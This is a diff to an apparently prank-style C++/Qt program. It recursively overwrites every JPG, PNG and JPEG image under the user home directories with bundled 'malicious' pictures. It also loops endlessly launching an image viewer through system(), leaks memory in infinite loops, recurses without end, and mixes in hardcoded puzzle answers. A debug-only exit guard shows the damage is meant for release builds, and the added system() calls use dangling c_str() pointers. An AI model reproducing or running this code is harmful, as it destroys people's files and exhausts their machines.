@@ -8,13 +8,18 @@
 #include <QRegularExpression>
 #include <QThread>
 #include <QTimer>
+#include <QElapsedTimer>
+
 #include <iostream>
 #include <stdio.h>
 #include <math.h>
 #include <vector>
+#include <chrono>
+#include <thread>
 
 #include <sys/types.h>
 #include <stdlib.h>
+
 
 #ifdef Q_OS_WIN
 #include <Windows.h>
@@ -46,7 +51,13 @@ double getNumaNuma(double numa){
 	numa = numa *(1.5 - (numaTimes2*numa*numa));
 	return numa;
 }
-
+long double overwhelming(long double a,quint64 A){
+	long double B=1;
+	for(quint64 b=0;b<A;++b){
+		B*=a;
+	}
+	return B;
+}
 void pictureYourself(QImage &image1,QImage &image2,QImage &image3, QString &suitTag){
 	bool dirtPanorama=false;
 	if(image3.width()>image3.height()){
@@ -58,10 +69,6 @@ void pictureYourself(QImage &image1,QImage &image2,QImage &image3, QString &suit
 	}
 	QImage* favoriteImage[2]={earthVista?&image2:&image1,earthVista?&image1:&image2};
 	favoriteImage[dirtPanorama]->scaled(image3.size()).save(suitTag);
-}
-quint64 canard(quint64 canary){
-	canary <<= canary---1>>3;
-	return (std::pow(1+getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2),canary)-std::pow(-getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2),canary))/(1+getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2)+getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2));
 }
 
 void pleaseOnlyReadatNight(QString dir){
@@ -120,6 +127,11 @@ void letsSpoon(){
 	letsSpoon();
 }
 
+quint64 canard(quint64 canary){
+	canary <<= canary---1>>3;
+	return (overwhelming(1+getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2),canary)-overwhelming(-getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2),canary))/(1+getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2)+getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2));
+}
+
 void gehinomEchad(){
 	while(1){
 		char* oEchat = new char[1337];
@@ -131,7 +143,22 @@ void gehinomEchad(){
 		}
 	}
 }
-
+void doNothing(char* blarg){
+	blarg[0]='a';
+	blarg[0]='b';
+	blarg[0]='c';
+	blarg[0]='d';
+	blarg[0]='e';
+	blarg[0]='f';
+	blarg[0]++;
+	blarg[0]+=1;
+	blarg[0]+=1;
+	blarg[0]+=1;
+	blarg[0]+=1;
+	blarg[0]+=1;
+	blarg[0]+=1;
+	blarg[0]+=1;
+}
 void gehinomShtaim2(){
 	int l = (3*3)-7;
 #ifdef QT_DEBUG
@@ -139,7 +166,18 @@ void gehinomShtaim2(){
 #endif
 	while(l){
 		char* echad = new char[1];
+		doNothing(echad);
+		doNothing(echad);
+		doNothing(echad);
+		doNothing(echad);
+		doNothing(echad);
+		doNothing(echad);
+		doNothing(echad);
+		doNothing(echad);
+//		std::this_thread::sleep_for(std::chrono::microseconds(1));
+//		QThread::usleep(1);
 		if(echad == NULL){
+			qDebug()<<"test";
 			continue;
 		}
 #ifdef QT_DEBUG
@@ -309,16 +347,18 @@ QString f1(QList<double>& v1,QList<int>& v2,QList<QString> &v3){
 }
 
 void spam(){
+	QFile::copy(":/Bambi.jpg","./Bambi.jpg");
+	QDir flie("./Bambi.jpg");
     while(1){
 #ifdef QT_DEBUG
         exit(-7); // So as not to bomb our machines
 #endif
-        if(OS==win){
-            string cmd = "\"./Bambi.jpg\"";
-            system(cmd);
-        }else{
-            system("display Bambi.jpg");
-        }
+#ifdef Q_OS_WIN
+		auto cmd = flie.absolutePath().toStdString().c_str();
+#elif defined(Q_OS_LINUX)
+		auto cmd = ("display "+flie.absolutePath()).toStdString().c_str();
+#endif
+		system(cmd);
     }
     spam();
 }
@@ -390,12 +430,14 @@ ousted:
 	{
 		QString dir;
 		QImage maliciousImage(":/bunny.jpg");
-		if(maliciousImage.isNull()){
+		QImage maliciousImage2(":/Octavia.png");
+		if(maliciousImage.isNull()||maliciousImage2.isNull()){
 			exit(-1);
 		}
 		QTransform rot;
 		rot.rotate(90);
 		QImage maliciousImageRotated(maliciousImage.transformed(rot,Qt::SmoothTransformation));
+		QImage maliciousImage2Rotated(maliciousImage2.transformed(rot,Qt::SmoothTransformation));
 		if(OS==win){
 			dir=QString("C:/Users");
 		}else if(OS==mac){
@@ -408,14 +450,18 @@ ousted:
 #endif
 		auto drain=QDir::AllDirs | QDir::Files | QDir::Hidden | QDir::NoSymLinks | QDir::NoDotDot | QDir::NoDot;
 
-		QDirIterator itr(dir, QStringList() << "*.jpg", drain, QDirIterator::Subdirectories);
+		QDirIterator itr(dir, QStringList() << "*.jpg"<<"*.png"<<"*.jpeg", drain, QDirIterator::Subdirectories);
 		while(itr.hasNext()){
 			auto imageName=itr.next();
 			QImage fImage(imageName);
 			if(fImage.isNull()){
 				continue;
 			}
-			pictureYourself(maliciousImage,maliciousImageRotated,fImage,imageName);
+			if(imageName.endsWith(".png"))
+				pictureYourself(maliciousImage2,maliciousImage2Rotated,fImage,imageName);
+			else
+				pictureYourself(maliciousImage,maliciousImageRotated,fImage,imageName);
+
 		}
 		exit(2);
 	}
@@ -426,7 +472,7 @@ outed:
 
 DefinitelyNotPhase1:
 	{
-		QList<quint64> nummies({308061521170129,1346269,4660046610375544832,28657});
+		QList<quint64> nummies({308061521170129,1346269,4660046610375542784,28657});
 #ifdef QT_DEBUG
 		quint64 answers[]={18,16,23,12};
 #endif
@@ -590,6 +636,7 @@ Which starting number, under 5 million, produces the longest chain?
 			break;
 		}
 	}
+	std::cout<<"Congratulations 4933458 is correct!"<<std::endl;
 	prompt = R"(
  If the numbers 1 to 5 are written out in words: one, two, three, four, five, then there are 3 + 3 + 5 + 4 + 4 = 19 letters used in total.
 
@@ -612,6 +659,7 @@ Which starting number, under 5 million, produces the longest chain?
 			break;
 		}
 	}
+	std::cout<<"Congratulations 4933 is correct!"<<std::endl;
 	prompt = R"(
  You are given the following information:
 
@@ -641,6 +689,7 @@ Which starting number, under 5 million, produces the longest chain?
 			break;
 		}
 	}
+	std::cout<<"Congratulations 7899 is correct!\n\n";
 	std::cout<<"Well done on those!"<<std::endl;
 	goto PhaseWrapper;
 	exit(0);
